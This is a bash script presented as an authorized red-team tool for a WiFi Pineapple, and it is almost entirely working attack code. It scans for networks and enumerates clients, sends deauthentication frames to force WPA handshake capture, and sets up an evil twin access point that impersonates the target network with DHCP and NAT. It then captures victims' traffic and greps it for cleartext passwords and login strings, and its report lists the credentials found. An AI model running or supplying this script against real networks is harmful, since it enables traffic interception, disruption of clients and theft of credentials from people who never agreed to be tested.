#!/bin/bash
# ============================================
# WiFi Pineapple Red Team Engagement Script
# Author: p0lygl07
# AUTHORIZED PENETRATION TESTING ONLY
# ============================================

INTERFACE="wlan0"
MONITOR_IFACE="wlan0mon"
ENGAGEMENT_DIR="/tmp/engagement_$(date +%Y%m%d_%H%M%S)"
LOGFILE="$ENGAGEMENT_DIR/engagement.log"
TARGET_SSID=""
TARGET_BSSID=""
TARGET_CHANNEL=""

# Colors
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# ============================================
# LOGGING
# ============================================
log() {
    echo -e "[$(date '+%H:%M:%S')] $1" | tee -a $LOGFILE
}

banner() {
    echo -e "${RED}"
    echo "============================================"
    echo "   WiFi Pineapple Red Team Script"
    echo "   Author: p0lygl07"
    echo "   AUTHORIZED ENGAGEMENTS ONLY"
    echo "============================================"
    echo -e "${NC}"
}

# ============================================
# PHASE 1 — RECONNAISSANCE
# ============================================
phase1_recon() {
    log "${BLUE}[PHASE 1] Starting reconnaissance...${NC}"
    mkdir -p $ENGAGEMENT_DIR/recon
    
    # Passive scan
    log "Starting passive wireless scan (60s)..."
    airodump-ng $MONITOR_IFACE \
        --output-format csv \
        --write $ENGAGEMENT_DIR/recon/passive \
        2>/dev/null &
    SCAN_PID=$!
    
    for i in $(seq 1 60); do
        echo -ne "\r[*] Passive scan... ${i}/60s"
        sleep 1
    done
    echo ""
    kill $SCAN_PID 2>/dev/null
    
    # Parse and display networks
    log "Networks discovered:"
    echo "============================================"
    echo "BSSID              CH  ENC    ESSID"
    echo "============================================"
    
    while IFS=',' read -r bssid first last ch speed privacy cipher auth power beacons iv lan_ip id_len essid key; do
        [[ "$bssid" == *"BSSID"* ]] && continue
        [[ "$bssid" == *"Station"* ]] && break
        [[ -z "$(echo $bssid | tr -d ' ')" ]] && continue
        
        bssid=$(echo $bssid | tr -d ' ')
        ch=$(echo $ch | tr -d ' ')
        privacy=$(echo $privacy | tr -d ' ')
        essid=$(echo $essid | tr -d ' ')
        
        printf "%-18s %-3s %-6s %s\n" "$bssid" "$ch" "$privacy" "$essid"
    done < "$ENGAGEMENT_DIR/recon/passive-01.csv"
    
    echo "============================================"
    
    # Select target
    echo ""
    read -p "[?] Enter target SSID: " TARGET_SSID
    read -p "[?] Enter target BSSID: " TARGET_BSSID
    read -p "[?] Enter target Channel: " TARGET_CHANNEL
    
    log "Target selected: SSID=$TARGET_SSID BSSID=$TARGET_BSSID CH=$TARGET_CHANNEL"
}

# ============================================
# PHASE 2 — CLIENT ENUMERATION
# ============================================
phase2_clients() {
    log "${BLUE}[PHASE 2] Enumerating clients on $TARGET_SSID...${NC}"
    mkdir -p $ENGAGEMENT_DIR/clients
    
    # Lock on target channel
    airodump-ng $MONITOR_IFACE \
        --bssid $TARGET_BSSID \
        --channel $TARGET_CHANNEL \
        --output-format csv \
        --write $ENGAGEMENT_DIR/clients/targets \
        2>/dev/null &
    CLIENT_PID=$!
    
    for i in $(seq 1 30); do
        echo -ne "\r[*] Enumerating clients... ${i}/30s"
        sleep 1
    done
    echo ""
    kill $CLIENT_PID 2>/dev/null
    
    # Parse clients
    log "Clients discovered:"
    echo "============================================"
    echo "CLIENT MAC          POWER  PROBES"
    echo "============================================"
    
    local in_clients=false
    while IFS=',' read -r station first last power packets bssid probes; do
        [[ "$station" == *"Station"* ]] && { in_clients=true; continue; }
        $in_clients || continue
        [[ -z "$(echo $station | tr -d ' ')" ]] && continue
        
        station=$(echo $station | tr -d ' ')
        power=$(echo $power | tr -d ' ')
        probes=$(echo $probes | tr -d ' ')
        
        printf "%-18s %-6s %s\n" "$station" "$power" "$probes"
        echo "$station" >> $ENGAGEMENT_DIR/clients/client_list.txt
        
    done < "$ENGAGEMENT_DIR/clients/targets-01.csv"
    
    echo "============================================"
    local count=$(wc -l < $ENGAGEMENT_DIR/clients/client_list.txt 2>/dev/null || echo 0)
    log "Found $count clients on $TARGET_SSID"
}

# ============================================
# PHASE 3 — HANDSHAKE CAPTURE
# ============================================
phase3_handshake() {
    log "${BLUE}[PHASE 3] Capturing WPA handshake...${NC}"
    mkdir -p $ENGAGEMENT_DIR/handshakes
    
    # Start capture
    airodump-ng $MONITOR_IFACE \
        --bssid $TARGET_BSSID \
        --channel $TARGET_CHANNEL \
        --write $ENGAGEMENT_DIR/handshakes/capture \
        2>/dev/null &
    CAP_PID=$!
    
    sleep 5
    
    # Send deauth to first client to force reconnect
    if [ -f "$ENGAGEMENT_DIR/clients/client_list.txt" ]; then
        TARGET_CLIENT=$(head -1 $ENGAGEMENT_DIR/clients/client_list.txt)
        log "Sending deauth to $TARGET_CLIENT..."
        
        aireplay-ng --deauth 5 \
            -a $TARGET_BSSID \
            -c $TARGET_CLIENT \
            $MONITOR_IFACE 2>/dev/null
    else
        log "No clients found — sending broadcast deauth..."
        aireplay-ng --deauth 5 \
            -a $TARGET_BSSID \
            $MONITOR_IFACE 2>/dev/null
    fi
    
    # Wait for handshake
    log "Waiting for handshake (30s)..."
    for i in $(seq 1 30); do
        echo -ne "\r[*] Waiting... ${i}/30s"
        
        # Check for handshake
        if aircrack-ng $ENGAGEMENT_DIR/handshakes/capture-01.cap 2>/dev/null | grep -q "1 handshake"; then
            echo ""
            log "${GREEN}Handshake captured!${NC}"
            kill $CAP_PID 2>/dev/null
            return 0
        fi
        sleep 1
    done
    echo ""
    kill $CAP_PID 2>/dev/null
    
    log "${YELLOW}Handshake not captured — try again${NC}"
    return 1
}

# ============================================
# PHASE 4 — EVIL TWIN
# ============================================
phase4_eviltwin() {
    log "${BLUE}[PHASE 4] Setting up Evil Twin AP...${NC}"
    mkdir -p $ENGAGEMENT_DIR/eviltwin
    
    # Stop monitor mode temporarily
    airmon-ng stop $MONITOR_IFACE &>/dev/null
    
    # Configure hostapd
    cat > $ENGAGEMENT_DIR/eviltwin/hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
channel=$TARGET_CHANNEL
hw_mode=g
ignore_broadcast_ssid=0
EOF
    
    # Configure DHCP
    cat > $ENGAGEMENT_DIR/eviltwin/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=192.168.100.10,192.168.100.100,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF
    
    # Set up interface
    ip addr flush dev $INTERFACE 2>/dev/null
    ip addr add 192.168.100.1/24 dev $INTERFACE
    ip link set $INTERFACE up
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # NAT rules
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    iptables -A FORWARD -i $INTERFACE -j ACCEPT
    
    # Start services
    dnsmasq -C $ENGAGEMENT_DIR/eviltwin/dnsmasq.conf &
    hostapd $ENGAGEMENT_DIR/eviltwin/hostapd.conf &
    
    log "${GREEN}Evil Twin AP running as '$TARGET_SSID'${NC}"
    log "Monitor connections at: $ENGAGEMENT_DIR/eviltwin/"
    
    # Monitor connections
    log "Monitoring client connections (press Ctrl+C to stop)..."
    tail -f /var/log/syslog | grep -i "dhcp\|associated\|connected" | tee -a $ENGAGEMENT_DIR/eviltwin/connections.log
}

# ============================================
# PHASE 5 — TRAFFIC ANALYSIS
# ============================================
phase5_traffic() {
    log "${BLUE}[PHASE 5] Starting traffic analysis...${NC}"
    mkdir -p $ENGAGEMENT_DIR/traffic
    
    # Capture traffic
    tcpdump -i $INTERFACE \
        -w $ENGAGEMENT_DIR/traffic/capture.pcap \
        -v 2>/dev/null &
    TCPDUMP_PID=$!
    
    log "Capturing traffic (60s)..."
    for i in $(seq 1 60); do
        echo -ne "\r[*] Capturing... ${i}/60s"
        sleep 1
    done
    echo ""
    kill $TCPDUMP_PID 2>/dev/null
    
    # Quick analysis
    log "Traffic analysis:"
    echo "============================================"
    
    # HTTP credentials
    log "Checking for cleartext credentials..."
    tcpdump -r $ENGAGEMENT_DIR/traffic/capture.pcap -A 2>/dev/null | \
        grep -iE "password|passwd|user|login|credential" | \
        tee $ENGAGEMENT_DIR/traffic/credentials.txt
    
    # DNS queries
    log "DNS queries captured:"
    tcpdump -r $ENGAGEMENT_DIR/traffic/capture.pcap -n 2>/dev/null | \
        grep "A?" | \
        awk '{print $NF}' | \
        sort | uniq -c | sort -rn | head -20 | \
        tee $ENGAGEMENT_DIR/traffic/dns_queries.txt
    
    echo "============================================"
}

# ============================================
# GENERATE ENGAGEMENT REPORT
# ============================================
generate_report() {
    log "Generating engagement report..."
    
    cat > $ENGAGEMENT_DIR/report.txt << EOF
============================================
RED TEAM ENGAGEMENT REPORT
============================================
Date:       $(date)
Operator:   kuliex270
Target:     $TARGET_SSID
BSSID:      $TARGET_BSSID
Channel:    $TARGET_CHANNEL

============================================
PHASES COMPLETED
============================================
[+] Phase 1 - Reconnaissance
[+] Phase 2 - Client Enumeration
[+] Phase 3 - Handshake Capture
[+] Phase 4 - Evil Twin
[+] Phase 5 - Traffic Analysis

============================================
CLIENTS DISCOVERED
============================================
$(cat $ENGAGEMENT_DIR/clients/client_list.txt 2>/dev/null)

============================================
CREDENTIALS FOUND
============================================
$(cat $ENGAGEMENT_DIR/traffic/credentials.txt 2>/dev/null)

============================================
TOP DNS QUERIES
============================================
$(cat $ENGAGEMENT_DIR/traffic/dns_queries.txt 2>/dev/null)

============================================
FILES GENERATED
============================================
$(ls -la $ENGAGEMENT_DIR/)
============================================
EOF

    echo ""
    echo -e "${GREEN}Report saved to: $ENGAGEMENT_DIR/report.txt${NC}"
    cat $ENGAGEMENT_DIR/report.txt
}

# ============================================
# CLEANUP
# ============================================
cleanup() {
    log "Cleaning up engagement..."
    kill $(jobs -p) 2>/dev/null
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    airmon-ng stop $MONITOR_IFACE &>/dev/null
    service NetworkManager restart &>/dev/null
    log "Engagement complete. Results in $ENGAGEMENT_DIR"
}

# ============================================
# MAIN
# ============================================
main() {
    banner
    
    # Check root
    if [ "$EUID" -ne 0 ]; then
        echo "Must run as root"
        exit 1
    fi
    
    # Enable monitor mode
    airmon-ng check kill &>/dev/null
    airmon-ng start $INTERFACE &>/dev/null
    
    case "$1" in
        recon)
            phase1_recon
            ;;
        clients)
            phase1_recon
            phase2_clients
            ;;
        handshake)
            phase1_recon
            phase2_clients
            phase3_handshake
            ;;
        eviltwin)
            phase1_recon
            phase4_eviltwin
            ;;
        traffic)
            phase1_recon
            phase4_eviltwin
            phase5_traffic
            ;;
        full)
            phase1_recon
            phase2_clients
            phase3_handshake
            phase4_eviltwin
            phase5_traffic
            generate_report
            ;;
        *)
            echo "Usage: $0 {recon|clients|handshake|eviltwin|traffic|full}"
            echo ""
            echo "Phases:"
            echo "  recon      - Passive wireless reconnaissance"
            echo "  clients    - Enumerate connected clients"
            echo "  handshake  - Capture WPA handshake"
            echo "  eviltwin   - Deploy evil twin AP"
            echo "  traffic    - Capture and analyze traffic"
            echo "  full       - Run all phases"
            exit 1
            ;;
    esac
}

trap cleanup EXIT INT TERM
main "$@"